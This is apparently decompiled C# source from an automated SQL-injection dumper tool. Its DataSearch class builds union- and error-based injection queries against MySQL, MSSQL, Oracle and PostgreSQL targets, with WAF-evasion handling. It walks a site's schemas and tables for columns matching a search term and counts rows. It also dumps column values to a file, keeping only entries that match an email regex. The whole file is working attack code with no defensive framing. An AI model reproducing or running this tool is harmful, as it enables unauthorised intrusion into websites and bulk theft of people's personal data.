using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

public class DataSearch
{
	public delegate void OnDataChangedEventHandler(string data);

	public delegate void OnCompleteEventHandler();

	public delegate void OnProgressEventHandler(int perc, string desc);

	private Stopwatch stopwatch_0;

	private string string_0;

	private Analyzer analyzer_0;

	private bool bool_0;

	private int int_0;

	private int int_1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private bool bool_1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private List<string> list_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private bool bool_2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private OnDataChangedEventHandler onDataChangedEventHandler_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private OnCompleteEventHandler onCompleteEventHandler_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private OnProgressEventHandler onProgressEventHandler_0;

	[SpecialName]
	private int _0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks_0024Init;

	public bool RetyFailed
	{
		[CompilerGenerated]
		get
		{
			return bool_1;
		}
		[CompilerGenerated]
		set
		{
			bool_1 = value;
		}
	}

	public int RowsCount
	{
		[CompilerGenerated]
		get
		{
			return int_2;
		}
		[CompilerGenerated]
		set
		{
			int_2 = value;
		}
	}

	public List<string> Result
	{
		[CompilerGenerated]
		get
		{
			return list_0;
		}
		[CompilerGenerated]
		set
		{
			list_0 = value;
		}
	}

	public bool CurrentDB
	{
		[CompilerGenerated]
		get
		{
			return bool_2;
		}
		[CompilerGenerated]
		set
		{
			bool_2 = value;
		}
	}

	public event OnDataChangedEventHandler OnDataChanged
	{
		[CompilerGenerated]
		add
		{
			OnDataChangedEventHandler onDataChangedEventHandler = onDataChangedEventHandler_0;
			OnDataChangedEventHandler onDataChangedEventHandler2;
			do
			{
				onDataChangedEventHandler2 = onDataChangedEventHandler;
				OnDataChangedEventHandler value2 = (OnDataChangedEventHandler)Delegate.Combine(onDataChangedEventHandler2, value);
				onDataChangedEventHandler = Interlocked.CompareExchange(ref onDataChangedEventHandler_0, value2, onDataChangedEventHandler2);
			}
			while ((object)onDataChangedEventHandler != onDataChangedEventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			OnDataChangedEventHandler onDataChangedEventHandler = onDataChangedEventHandler_0;
			OnDataChangedEventHandler onDataChangedEventHandler2;
			do
			{
				onDataChangedEventHandler2 = onDataChangedEventHandler;
				OnDataChangedEventHandler value2 = (OnDataChangedEventHandler)Delegate.Remove(onDataChangedEventHandler2, value);
				onDataChangedEventHandler = Interlocked.CompareExchange(ref onDataChangedEventHandler_0, value2, onDataChangedEventHandler2);
			}
			while ((object)onDataChangedEventHandler != onDataChangedEventHandler2);
		}
	}

	public event OnCompleteEventHandler OnComplete
	{
		[CompilerGenerated]
		add
		{
			OnCompleteEventHandler onCompleteEventHandler = onCompleteEventHandler_0;
			OnCompleteEventHandler onCompleteEventHandler2;
			do
			{
				onCompleteEventHandler2 = onCompleteEventHandler;
				OnCompleteEventHandler value2 = (OnCompleteEventHandler)Delegate.Combine(onCompleteEventHandler2, value);
				onCompleteEventHandler = Interlocked.CompareExchange(ref onCompleteEventHandler_0, value2, onCompleteEventHandler2);
			}
			while ((object)onCompleteEventHandler != onCompleteEventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			OnCompleteEventHandler onCompleteEventHandler = onCompleteEventHandler_0;
			OnCompleteEventHandler onCompleteEventHandler2;
			do
			{
				onCompleteEventHandler2 = onCompleteEventHandler;
				OnCompleteEventHandler value2 = (OnCompleteEventHandler)Delegate.Remove(onCompleteEventHandler2, value);
				onCompleteEventHandler = Interlocked.CompareExchange(ref onCompleteEventHandler_0, value2, onCompleteEventHandler2);
			}
			while ((object)onCompleteEventHandler != onCompleteEventHandler2);
		}
	}

	public event OnProgressEventHandler OnProgress
	{
		[CompilerGenerated]
		add
		{
			OnProgressEventHandler onProgressEventHandler = onProgressEventHandler_0;
			OnProgressEventHandler onProgressEventHandler2;
			do
			{
				onProgressEventHandler2 = onProgressEventHandler;
				OnProgressEventHandler value2 = (OnProgressEventHandler)Delegate.Combine(onProgressEventHandler2, value);
				onProgressEventHandler = Interlocked.CompareExchange(ref onProgressEventHandler_0, value2, onProgressEventHandler2);
			}
			while ((object)onProgressEventHandler != onProgressEventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			OnProgressEventHandler onProgressEventHandler = onProgressEventHandler_0;
			OnProgressEventHandler onProgressEventHandler2;
			do
			{
				onProgressEventHandler2 = onProgressEventHandler;
				OnProgressEventHandler value2 = (OnProgressEventHandler)Delegate.Remove(onProgressEventHandler2, value);
				onProgressEventHandler = Interlocked.CompareExchange(ref onProgressEventHandler_0, value2, onProgressEventHandler2);
			}
			while ((object)onProgressEventHandler != onProgressEventHandler2);
		}
	}

	public DataSearch(string url, Analyzer a, bool IsDumper)
	{
		stopwatch_0 = Stopwatch.StartNew();
		string_0 = url;
		analyzer_0 = a;
		bool_0 = IsDumper;
		if (bool_0)
		{
			int_0 = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.DumperForm.numMaxRetry));
			int_1 = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.DumperForm.numSleep));
		}
		else
		{
			int_0 = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.numHTTPRetry));
			int_1 = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.numExploitingDelay));
		}
	}

	private void method_0(int int_3, int int_4, string string_1)
	{
		int num = checked((int)Math.Round(Math.Round((double)(100 * int_3) / (double)int_4)));
		if (bool_0)
		{
			Globals.GMain.DumperForm.method_4(Conversions.ToString(num));
			Globals.GMain.DumperForm.UpDateStatus("[" + Globals.FormatNumbers(int_3) + " | " + Globals.FormatNumbers(int_4, bIgnoreZero: false) + "] " + Conversions.ToString(num) + "% " + Globals.translate_0.GetStr(Globals.GMain, 22) + ", " + Globals.translate_0.GetStr("SearchColumn", "mnuRowsCount") + " " + Globals.FormatNumbers(RowsCount, bIgnoreZero: false));
		}
		else
		{
			onProgressEventHandler_0?.Invoke(num, "[" + Globals.FormatNumbers(int_3, bIgnoreZero: false) + " | " + Globals.FormatNumbers(int_4, bIgnoreZero: false) + "] " + Conversions.ToString(num) + "% " + Globals.translate_0.GetStr(Globals.GMain, 22) + ", " + Globals.translate_0.GetStr("SearchColumn", "mnuRowsCount") + " " + Globals.FormatNumbers(RowsCount, bIgnoreZero: false));
		}
	}

	public long SearchColumn(string sSearch)
	{
		checked
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				List<string> list3 = new List<string>();
				List<string> list4 = new List<string>();
				List<string> list5 = new List<string>();
				Result = new List<string>();
				RowsCount = 0;
				int num3 = default(int);
				int num2 = default(int);
				switch (analyzer_0.DBType)
				{
				case Types.MySQL_No_Error:
				case Types.MySQL_With_Error:
				{
					if (analyzer_0.Version.StartsWith("4"))
					{
						break;
					}
					list3.AddRange(new string[2] { "d.schema_name", "t.table_name" });
					string text = "from information_schema.schemata as d join information_schema.tables as t on t.table_schema=d.schema_name join information_schema.columns as c on c.table_schema=d.schema_name and c.table_name=t.table_name where not c.table_schema in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) " + (CurrentDB ? "and d.schema_name=database() " : " ") + "and lower(c.column_name) like " + Class23.smethod_20("%" + sSearch.ToLower() + "%") + " # ";
					int num = method_1(string_0, "*", text.Replace("#", ""));
					text += " limit [x],[y]";
					if (num <= 0)
					{
						break;
					}
					if (analyzer_0.DBType == Types.MySQL_No_Error)
					{
						text = text.Replace("#", "");
						while (!method_6())
						{
							string string_ = MySQLNoError.Dump(string_0, analyzer_0.MySQLCollactions, bHexEncoded: false, bIFNULL: false, "", "", list3, num2, 1, "", "", "", text);
							string string_2 = method_8(string_);
							list5 = method_2(string_2);
							if (list5.Count == 0)
							{
								num3++;
								if (num3 > int_0)
								{
									RetyFailed = true;
									break;
								}
								continue;
							}
							num3 = 0;
							if (!list4.Contains(list5[0] + "." + list5[1]))
							{
								list4.Add(list5[0] + "." + list5[1]);
								method_3(list5[0], list5[1]);
							}
							num2++;
							method_0(num2, num, sSearch);
							if (num2 >= num)
							{
								break;
							}
						}
					}
					else
					{
						if (analyzer_0.DBType != Types.MySQL_With_Error)
						{
							break;
						}
						list2 = new List<string>();
						string text2 = text;
						string text3 = "";
						do
						{
							if (list2.Count <= 0)
							{
								text = text2.Replace("#", "").ToLower();
							}
							else
							{
								string text4 = " and not t.table_name in (";
								int num4 = list2.Count - 1;
								for (int i = 0; i <= num4; i++)
								{
									if (i != 0)
									{
										text4 += ",";
									}
									text4 += Class23.smethod_20(list2[i]);
								}
								text4 += ")";
								text = text2.Replace("#", text4).ToLower();
							}
							text = text.Replace("  ", " ");
							int num5 = 0;
							list5.Clear();
							while (!method_6())
							{
								list3.Clear();
								switch (num5)
								{
								case 0:
									list3.Add("d.schema_name");
									if (unchecked((CurrentDB & !string.IsNullOrEmpty(text3)) && num5 == 0))
									{
										list5.Add(text3);
										num5++;
										continue;
									}
									goto default;
								case 1:
									list3.Add("t.table_name");
									goto default;
								default:
								{
									string string_ = MySQLWithError.Dump(string_0, analyzer_0.MySQLCollactions, analyzer_0.MySQLErrorType, bIFNULL: false, "", "", list3, num2, 1, "", "", "", text);
									string string_2 = method_8(string_);
									List<string> list6 = method_2(string_2);
									if (list6.Count == 0)
									{
										num3++;
										if (num3 <= int_0)
										{
											continue;
										}
										RetyFailed = true;
										break;
									}
									if (unchecked(CurrentDB && num5 == 0))
									{
										text3 = list6[0];
									}
									list5.Add(list6[0]);
									num3 = 0;
									num5++;
									continue;
								}
								case 2:
									if (list5.Count > 0)
									{
										if (list4.Contains(list5[0] + "." + list5[1]))
										{
											list5.Clear();
											break;
										}
										list4.Add(list5[0] + "." + list5[1]);
										method_3(list5[0], list5[1]);
										list2.Add(list5[1]);
									}
									break;
								}
								break;
							}
							num2++;
							method_0(num2, num, sSearch);
						}
						while (num2 < num);
					}
					break;
				}
				case Types.MSSQL_No_Error:
				case Types.MSSQL_With_Error:
					while (!method_6())
					{
						list3.Clear();
						if (num2 == 0)
						{
							list3.Add("DB_NAME()");
						}
						else
						{
							if (CurrentDB || list.Count == 0)
							{
								break;
							}
							list3.Add("DB_NAME(" + Conversions.ToString(num2) + ")");
						}
						string string_ = MSSQL.Info(string_0, unchecked((InjectionType)Conversions.ToInteger(Interaction.IIf(analyzer_0.DBType == Types.MSSQL_No_Error, InjectionType.Union, InjectionType.Error))), analyzer_0.MSSQLCollate, list3, analyzer_0.MSSQLCast);
						string string_2 = method_8(string_);
						List<string> list7 = method_2(string_2);
						if ((list7.Count == 0) & unchecked(!CurrentDB && num2 == 0))
						{
							num3++;
							if (num3 > int_0)
							{
								RetyFailed = true;
								break;
							}
							continue;
						}
						if (list7.Count == 0)
						{
							break;
						}
						list.Add(list7[0]);
						num3 = 0;
						num2++;
					}
					num3 = 0;
					num2 = 0;
					if (list.Count == 0)
					{
						break;
					}
					do
					{
						string text6 = list[num2].ToLower();
						bool flag;
						if ((flag = true) == text6.Equals("master") || flag == text6.Equals("model") || flag == text6.Equals("msdb") || flag == text6.Equals("tempdb") || flag == text6.Contains("$sqlexpress"))
						{
							list.RemoveAt(num2);
						}
						num2++;
					}
					while (num2 < list.Count - 1);
					num2 = 0;
					while (!method_6() && num2 <= list.Count - 1)
					{
						string text7 = list[num2];
						string text = "select cast(count(t.name) as char) as x from [" + text7 + "]..[sysobjects] t join [syscolumns] as c on t.id=c.id where t.xtype=char(85) and lower(c.name) like " + Class23.smethod_21("%" + sSearch.ToLower() + "%", bool_0: false);
						int num = method_1(string_0, "*", text);
						if (num == 0)
						{
							num2++;
							continue;
						}
						text = "select top 1 x from ( select distinct top [x] (t.name) as x from [" + text7 + "]..[sysobjects] t join [syscolumns] as c on t.id=c.id where t.xtype=char(85) and lower(c.name) like " + Class23.smethod_21("%" + sSearch.ToLower() + "%", bool_0: false) + " order by x asc) sq order by x desc";
						int num6 = 0;
						while (!method_6())
						{
							string string_ = MSSQL.Dump(string_0, "", "", null, bIFNULL: false, unchecked((InjectionType)Conversions.ToInteger(Interaction.IIf(analyzer_0.DBType == Types.MSSQL_No_Error, InjectionType.Union, InjectionType.Error))), analyzer_0.MSSQLCast, analyzer_0.MSSQLCollate, num6, 0, "", "", "", text);
							string string_2 = method_8(string_);
							list5 = method_2(string_2);
							if (list5.Count == 0)
							{
								num3++;
								if (num3 > int_0)
								{
									RetyFailed = true;
									break;
								}
								continue;
							}
							method_3(text7, list5[0]);
							num3 = 0;
							num6++;
							method_0(num2 + 1, list.Count, sSearch);
							if (num6 > num)
							{
								break;
							}
						}
						num2++;
					}
					break;
				case Types.Oracle_No_Error:
				case Types.Oracle_With_Error:
				{
					string text5 = default(string);
					if (CurrentDB)
					{
						list5 = analyzer_0.GetInfo(string_0, "(select name from v$database)");
						if (list5.Count <= 0)
						{
							break;
						}
						text5 = list5[0];
					}
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("# from (select rownum r, owner as d, table_name as t from all_tab_columns where lower(column_name) like " + Class23.smethod_21("%" + sSearch.ToLower() + "%", bool_0: false, "||", "chr") + " and column_name not in (" + Class23.smethod_21("SYS", bool_0: false, "||", "chr") + ", " + Class23.smethod_21("OUTLN", bool_0: false, "||", "chr") + ", " + Class23.smethod_21("SYSTEM", bool_0: false, "||", "chr") + ", " + Class23.smethod_21("WMSYS", bool_0: false, "||", "chr") + ", " + Class23.smethod_21("ORDSYS", bool_0: false, "||", "chr") + ", " + Class23.smethod_21("MDSYS", bool_0: false, "||", "chr") + ")", Interaction.IIf(CurrentDB, "and owner=" + Class23.smethod_21(text5, bool_0: false, "||", "chr"), "")), ")"));
					int num = method_1(string_0, "*", text.Replace("#", "select count(*)"));
					if (num == 0)
					{
						break;
					}
					text = text.Replace("#", "select d [s] t") + " where r = [x]";
					while (!method_6())
					{
						string string_ = Oracle.Dump(string_0, unchecked((InjectionType)Conversions.ToInteger(Interaction.IIf(analyzer_0.DBType == Types.Oracle_No_Error, InjectionType.Union, InjectionType.Error))), analyzer_0.OracleErrorType, "", "", list3, analyzer_0.OracleCast, OracleTopN.ROWNUM, num2, "", "", "", text);
						string string_2 = method_8(string_);
						list5 = method_2(string_2);
						if (list5.Count == 0)
						{
							num3++;
							if (num3 > int_0)
							{
								RetyFailed = true;
								break;
							}
							continue;
						}
						method_3(list5[0], list5[1]);
						num3 = 0;
						num2++;
						method_0(num2, num, sSearch);
						if (num2 > num)
						{
							break;
						}
					}
					break;
				}
				case Types.PostgreSQL_No_Error:
				case Types.PostgreSQL_With_Error:
				{
					string text = "select distinct current_database() [s] relname from pg_class c, pg_namespace n, pg_attribute a, pg_type t where (c.relkind=" + Class23.smethod_21("r", bool_0: false, "||", "chr") + ") and (n.oid=c.relnamespace) and (a.attrelid=c.oid) and (a.atttypid=t.oid) and (a.attnum>0) and (not a.attisdropped) and (n.nspname like " + Class23.smethod_21("public", bool_0: false, "||", "chr") + ") and (lower(attname) like " + Class23.smethod_21("%" + sSearch.ToLower() + "%", bool_0: false, "||", "chr") + ")";
					int num = method_1(string_0, "*", "select count(*) from (" + text + ") as t");
					text += " limit 1 offset [x]";
					if (num == 0)
					{
						break;
					}
					while (!method_6())
					{
						string string_ = PostgreSQL.Dump(string_0, unchecked((InjectionType)Conversions.ToInteger(Interaction.IIf(analyzer_0.DBType == Types.PostgreSQL_No_Error, InjectionType.Union, InjectionType.Error))), "", "", list3, analyzer_0.PostgreSQLErrorType, num2, "", "", "", "(" + text + ")");
						string string_2 = method_8(string_);
						list5 = method_2(string_2);
						if (list5.Count == 0)
						{
							num3++;
							if (num3 > int_0)
							{
								RetyFailed = true;
								break;
							}
							continue;
						}
						method_3(list5[0], list5[1]);
						num3 = 0;
						num2++;
						method_0(num2, num, sSearch);
						if (num2 > num)
						{
							break;
						}
					}
					break;
				}
				case Types.MSSQL_Unknown:
				case Types.Oracle_Unknown:
				case Types.PostgreSQL_Unknown:
					break;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox(ex2.ToString());
				ProjectData.ClearProjectError();
			}
			finally
			{
				onCompleteEventHandler_0?.Invoke();
			}
			return RowsCount;
		}
	}

	private int method_1(string string_1, string string_2, string string_3)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list.Add("count(" + string_2 + ")");
		string string_4 = default(string);
		switch (analyzer_0.DBType)
		{
		case Types.MySQL_No_Error:
			string_4 = MySQLNoError.Dump(string_1, analyzer_0.MySQLCollactions, bHexEncoded: false, bIFNULL: false, "", "", list, 0, 1, "", "", "", string_3);
			break;
		case Types.MySQL_With_Error:
			string_4 = MySQLWithError.Dump(string_1, analyzer_0.MySQLCollactions, analyzer_0.MySQLErrorType, bIFNULL: false, "", "", list, 0, 1, "", "", "", string_3);
			break;
		case Types.MSSQL_No_Error:
			string_4 = MSSQL.Dump(string_1, "", "", list, bIFNULL: false, InjectionType.Union, analyzer_0.MSSQLCast, analyzer_0.MSSQLCollate, 0, 0, "", "", "", string_3);
			break;
		case Types.MSSQL_With_Error:
			string_4 = MSSQL.Dump(string_1, "", "", list, bIFNULL: false, InjectionType.Error, analyzer_0.MSSQLCast, analyzer_0.MSSQLCollate, 0, 0, "", "", "", string_3);
			break;
		case Types.Oracle_No_Error:
			string_4 = Oracle.Dump(string_1, InjectionType.Union, analyzer_0.OracleErrorType, "", "", list, bCastAsChar: false, OracleTopN.ROWNUM, 0, "", "", "", string_3);
			break;
		case Types.Oracle_With_Error:
			string_4 = Oracle.Dump(string_1, InjectionType.Error, analyzer_0.OracleErrorType, "", "", list, bCastAsChar: false, OracleTopN.ROWNUM, 0, "", "", "", string_3);
			break;
		case Types.PostgreSQL_No_Error:
			string_4 = PostgreSQL.Dump(string_1, InjectionType.Union, "", "", list, analyzer_0.PostgreSQLErrorType, 0, "", "", "", "(" + string_3 + ")");
			break;
		case Types.PostgreSQL_With_Error:
			string_4 = PostgreSQL.Dump(string_1, InjectionType.Error, "", "", list, analyzer_0.PostgreSQLErrorType, 0, "", "", "", "(" + string_3 + ")");
			break;
		}
		if (method_6())
		{
			return 0;
		}
		string string_5 = method_8(string_4);
		list2 = method_2(string_5);
		if (list2.Count > 0)
		{
			if (Versioned.IsNumeric(list2[0]))
			{
				return int.Parse(list2[0]);
			}
			return 0;
		}
		return 0;
	}

	private List<string> method_2(string string_1)
	{
		List<string> list = new List<string>();
		if (!string.IsNullOrEmpty(string_1))
		{
			list = Globals.GMain.DumperForm.method_17(string_1, analyzer_0.DBType);
			if (list.Count == 1)
			{
				string[] array = Strings.Split(list[0], Class54.string_2);
				list.Clear();
				string[] array2 = array;
				foreach (string text in array2)
				{
					list.Add(text.Replace(" ", "").Trim());
				}
			}
		}
		return list;
	}

	private bool method_3(string string_1, string string_2)
	{
		checked
		{
			if (!string.IsNullOrEmpty(string_1))
			{
				int num;
				switch (analyzer_0.DBType)
				{
				case Types.MSSQL_No_Error:
				case Types.MSSQL_With_Error:
					num = method_1(string_0, "*", "select cast(count(*) as char) as x from [" + string_1 + "]..[" + string_2 + "]");
					break;
				case Types.Oracle_No_Error:
				case Types.Oracle_With_Error:
					num = method_1(string_0, "*", "select count (*) from " + string_1 + "." + string_2);
					break;
				default:
					num = ((!string.IsNullOrEmpty(string_1)) ? method_1(string_0, "*", "from " + string_1 + "." + string_2) : method_1(string_0, "*", "from " + string_2));
					break;
				case Types.PostgreSQL_No_Error:
				case Types.PostgreSQL_With_Error:
					num = method_1(string_0, "*", "select count (*) from " + string_2);
					break;
				}
				if (num > 0)
				{
					string text = string.Concat(str3: (!string.IsNullOrEmpty(string_1)) ? (string_1 + "." + string_2) : string_2, str0: "[", str1: Globals.FormatNumbers(num, bIgnoreZero: false).PadLeft(9, ' '), str2: "] ");
					if (!Result.Contains(text))
					{
						RowsCount += num;
						Result.Add(text);
						onDataChangedEventHandler_0?.Invoke(text);
					}
				}
				return true;
			}
			return false;
		}
	}

	private void method_4(string string_1, List<string> list_1)
	{
		checked
		{
			InjectionType oError = default(InjectionType);
			string string_2 = default(string);
			int num = default(int);
			string text2 = default(string);
			int num2 = default(int);
			foreach (string item in list_1)
			{
				if (File.Exists(string_1))
				{
					continue;
				}
				string[] array = item.Split('.');
				List<string> list = new List<string>();
				if (analyzer_0.DBType == Types.MSSQL_With_Error)
				{
					if (analyzer_0.DBType == Types.MSSQL_No_Error)
					{
						oError = InjectionType.Union;
					}
					else
					{
						oError = InjectionType.Error;
						string sCustomQuery = "select top 1 x from ( select distinct top [x] (t.name + Char(46) + c.name) as x from [" + array[0] + "]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and c.name like " + Class23.smethod_21("%id%", bool_0: false) + " order by x asc) sq order by x desc";
						while (true)
						{
							string_2 = MSSQL.Dump(string_0, "", "", null, bIFNULL: false, oError, "char", analyzer_0.MSSQLCollate, 0, 0, "", "", "", sCustomQuery);
							string text = method_8(string_2);
							if (!string.IsNullOrEmpty(text))
							{
								num = 0;
								list = method_2(text);
								if (list.Count != 0)
								{
									num = 0;
									text2 = Strings.Split(list[0], Class54.string_2)[0];
									break;
								}
								num++;
								if (num > int_0)
								{
									RetyFailed = true;
									break;
								}
							}
							else
							{
								num++;
								if (num > int_0)
								{
									RetyFailed = true;
									break;
								}
							}
						}
						if (string.IsNullOrEmpty(text2))
						{
							continue;
						}
					}
				}
				try
				{
					StreamWriter streamWriter = new StreamWriter(string_1);
					list = new List<string>();
					list.Add(array[2]);
					if (analyzer_0.DBType == Types.MSSQL_With_Error)
					{
						list.Add(text2);
					}
					int num3 = num2 - 1;
					for (int i = 0; i <= num3; i++)
					{
						switch (analyzer_0.DBType)
						{
						case Types.MySQL_No_Error:
							string_2 = MySQLNoError.Dump(string_0, analyzer_0.MySQLCollactions, bHexEncoded: false, bIFNULL: false, array[0], array[1], list, i);
							break;
						case Types.MySQL_With_Error:
							string_2 = MySQLWithError.Dump(string_0, analyzer_0.MySQLCollactions, analyzer_0.MySQLErrorType, bIFNULL: false, array[0], array[1], list, i);
							break;
						case Types.MSSQL_No_Error:
						case Types.MSSQL_With_Error:
							string_2 = MSSQL.Dump(string_0, Conversions.ToString(Interaction.IIf(CurrentDB, "", array[0])), array[1], list, bIFNULL: true, oError, analyzer_0.MSSQLCast, analyzer_0.MSSQLCollate, i, num2, list[0] + " like 0x254025");
							break;
						}
						if (method_6())
						{
							break;
						}
						string text = method_8(string_2);
						if (string.IsNullOrEmpty(text))
						{
							if (num >= int_0)
							{
								break;
							}
						}
						else
						{
							num = 0;
						}
						if (string.IsNullOrEmpty(text))
						{
							continue;
						}
						list = Globals.GMain.DumperForm.method_17(text, analyzer_0.DBType);
						if (list.Count > 0)
						{
							text = Strings.Split(list[0], Class54.string_2)[0];
							if (_0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks_0024Init == null)
							{
								Interlocked.CompareExchange(ref _0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks_0024Init, new StaticLocalInitFlag(), null);
							}
							bool lockTaken = false;
							try
							{
								Monitor.Enter(_0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks_0024Init, ref lockTaken);
								if (_0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks_0024Init.State == 0)
								{
									_0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks_0024Init.State = 2;
									_0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks = 0;
								}
								else if (_0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks_0024Init.State == 2)
								{
									throw new IncompleteInitialization();
								}
							}
							finally
							{
								_0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks_0024Init.State = 1;
								if (lockTaken)
								{
									Monitor.Exit(_0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks_0024Init);
								}
							}
							if (method_5(text))
							{
								streamWriter.WriteLine(text);
								if (unchecked(i % 10) == 0)
								{
									streamWriter.Flush();
								}
								_0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks = 0;
							}
							else
							{
								_0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks++;
								if (_0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks > 20)
								{
									_0024STATIC_0024DumpToFile_00242021E151280A11E_0024MaxBlacks = 0;
									continue;
								}
							}
							num = 0;
						}
						else
						{
							num++;
						}
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Interaction.MsgBox(string_0 + "\r\n\r\n" + ex2.StackTrace);
					Clipboard.SetText(string_0);
					ProjectData.ClearProjectError();
				}
				finally
				{
				}
			}
		}
	}

	private bool method_5(string string_1)
	{
		bool result;
		try
		{
			Match match = Regex.Match(string_1.Trim(), "^[a-zA-Z][\\w\\.-]*[a-zA-Z0-9]@[a-zA-Z0-9][\\w\\.-]*[a-zA-Z0-9]\\.[a-zA-Z][a-zA-Z\\.]*[a-zA-Z]$");
			result = match.Success;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private bool method_6()
	{
		if (bool_0)
		{
			if (Globals.GMain.DumperForm.WorkedRequestStop())
			{
				return true;
			}
		}
		else if (Globals.GMain.method_23())
		{
			return true;
		}
		return RetyFailed;
	}

	private void method_7()
	{
		while (!RetyFailed && !(stopwatch_0.Elapsed.TotalMilliseconds > (double)int_1))
		{
			if (bool_0)
			{
				if (Globals.GMain.DumperForm.WorkedRequestStop())
				{
					break;
				}
			}
			else if (Globals.GMain.method_23())
			{
				break;
			}
			Thread.Sleep(100);
			Application.DoEvents();
		}
	}

	private string method_8(string string_1)
	{
		if (Conversions.ToBoolean(Globals.GetObjectValue(Globals.GMain.chkAnalizeWAF)))
		{
			string_1 = Class23.smethod_15(string_1);
		}
		if (bool_0)
		{
			analyzer_0.HTTPExt_0.FollowRedirects = Conversions.ToBoolean(Globals.GetObjectValue(Globals.GMain.DumperForm.chkHttpRedirect));
			analyzer_0.HTTPExt_0.TimeOut = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.DumperForm.numTimeOut));
		}
		else
		{
			analyzer_0.HTTPExt_0.TimeOut = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.numHTTPTimeout));
		}
		int num = int_0;
		for (int i = 0; i <= num; i = checked(i + 1))
		{
			method_7();
			if (!method_6())
			{
				string text = analyzer_0.HTTPExt_0.QuickGet(string_1);
				stopwatch_0 = Stopwatch.StartNew();
				if (string.IsNullOrEmpty(text))
				{
					if (analyzer_0.HTTPExt_0.Status() > 0)
					{
						break;
					}
					if (i >= int_0)
					{
						RetyFailed = true;
					}
					continue;
				}
				return text;
			}
			return Conversions.ToString(Value: false);
		}
		return string.Empty;
	}
}
